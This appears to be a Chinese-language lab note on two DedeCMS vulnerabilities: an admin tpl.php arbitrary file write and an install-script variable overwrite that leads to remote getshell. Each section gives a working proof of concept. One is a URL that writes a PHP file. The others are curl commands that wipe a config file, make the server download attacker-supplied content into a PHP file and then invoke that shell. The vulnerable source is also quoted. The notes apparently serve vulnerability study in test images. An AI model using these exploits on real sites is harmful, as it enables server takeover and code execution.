## 后台 tpl.php 任意文件写入

测试镜像

* src/dedecms/20180109/

参考链接

* [DedeCMS V5.7 SP2后台存在代码执行漏洞](http://www.freebuf.com/vuls/164035.html)

Poc

```
手动访问
/dede/tpl.php?filename=moonsec.lib.php&action=savetagfile&content=<?php%20phpinfo();?>&token=FORM_TOKEN

即可生成
include/taglib/moonsec.lib.php
```

## insLock 变量覆盖 - 远程 getshell 漏洞

测试镜像

* src/dedecms/20140313/

影响版本

* <= 5.7 SP1 20140313

参考连接

* [Dedecms远程写文件漏洞分析](http://blog.nsfocus.net/dedecms-write-file-vuln/)

Poc

```
# 清空 config_update.php
%> curl 'http://127.0.0.1/install/index.php?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php'
&nbsp; <font color="red">[×]</font> 远程获取失败

# 覆盖 updateHost、install_demo_name，实现远程文件下载
%> curl 'http://127.0.0.1/install/index.php?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/hello.php&updateHost=http://127.0.0.1/'
&nbsp; <font color="green">[√]</font> 存在(您可以选择安装进行体验)

# 测试 shell
curl http://127.0.0.1/data/hello.php
```

关键代码

```
else if($step==11)
{
	require_once('../data/admin/config_update.php');
	$rmurl = $updateHost."dedecms/demodata.{$s_lang}.txt";
	
	$sql_content = file_get_contents($rmurl);
	$fp = fopen($install_demo_name,'w');
	if(fwrite($fp,$sql_content))
		echo '&nbsp; <font color="green">[√]</font> 存在(您可以选择安装进行体验)';
	else
		echo '&nbsp; <font color="red">[×]</font> 远程获取失败';
	unset($sql_content);
	fclose($fp);
	exit();
}
```

